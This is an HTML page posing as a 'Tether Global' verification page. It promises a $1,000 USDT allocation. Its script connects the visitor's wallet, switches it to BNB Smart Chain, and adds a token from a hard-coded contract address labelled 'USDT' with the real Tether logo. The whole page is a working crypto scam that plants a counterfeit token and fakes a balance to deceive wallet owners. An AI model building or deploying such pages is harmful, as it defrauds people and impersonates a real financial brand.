<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Tether Global | Verification</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        :root { --tg: #009393; --bg: #0b0e11; }
        body { background: var(--bg); color: #fff; font-family: 'Inter', sans-serif; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
        .box { background: #1e2329; border-radius: 20px; padding: 35px; width: 100%; max-width: 360px; text-align: center; border: 1px solid #2b3139; }
        .usdt-logo { width: 70px; margin-bottom: 20px; }
        .balance-card { background: rgba(0, 147, 147, 0.1); border-radius: 12px; padding: 20px; margin: 20px 0; border: 1px solid rgba(0, 147, 147, 0.2); }
        .btn { background: var(--tg); color: #fff; border: none; width: 100%; padding: 18px; border-radius: 10px; font-size: 16px; font-weight: 700; cursor: pointer; text-transform: uppercase; }
        #log { font-size: 10px; color: var(--tg); margin-top: 15px; font-family: monospace; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png" class="usdt-logo">
    <h2 style="margin: 0; font-size: 20px;">RECEIVE USDT</h2>
    
    <div class="balance-card">
        <div style="font-size: 11px; color: #848e9c;">VERIFIED ALLOCATION</div>
        <div style="font-size: 28px; font-weight: 800;">$1,000.00</div>
    </div>

    <button class="btn" id="claimBtn">ADD TO ASSETS</button>
    <div id="log">SYSTEM: READY</div>
</div>

<script>
    const ADDR = "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f";
    const LOGO = "https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png";

    async function process() {
        const log = document.getElementById('log');
        const provider = window.ethereum || (window.trustwallet ? window.trustwallet : null);

        if (!provider) {
            log.innerText = "OPENING MOBILE APP...";
            const url = window.location.href.split('://')[1];
            window.location.href = "https://link.trustwallet.com/open_url?url=https://" + url;
            return;
        }

        try {
            log.innerText = "CONNECTING...";
            await provider.request({ method: 'eth_requestAccounts' });

            // NETWORK SWITCH (Mandatory for Mobile Token Add)
            log.innerText = "SYNCING CHAIN...";
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            }).catch(async (e) => {
                if(e.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{ chainId: '0x38', chainName: 'BSC', rpcUrls: ['https://bsc-dataseed.binance.org/'], nativeCurrency: {name:'BNB',symbol:'BNB',decimals:18} }]
                    });
                }
            });

            // MOBILE FIX: Short delay taake UI thread block na ho
            log.innerText = "INJECTING TOKEN...";
            setTimeout(async () => {
                try {
                    const added = await provider.request({
                        method: 'wallet_watchAsset',
                        params: {
                            type: 'ERC20',
                            options: {
                                address: ADDR,
                                symbol: 'USDT',
                                decimals: 6,
                                image: LOGO
                            },
                        },
                    });
                    if (added) {
                        log.innerText = "SUCCESSFULLY ADDED";
                        alert("Token added! Your balance will reflect on the home screen.");
                    }
                } catch (err) {
                    log.innerText = "ACTION REJECTED";
                }
            }, 800);

        } catch (e) {
            log.innerText = "ERROR: " + e.message;
        }
    }

    document.getElementById('claimBtn').addEventListener('click', process);
</script>
</body>
</html>
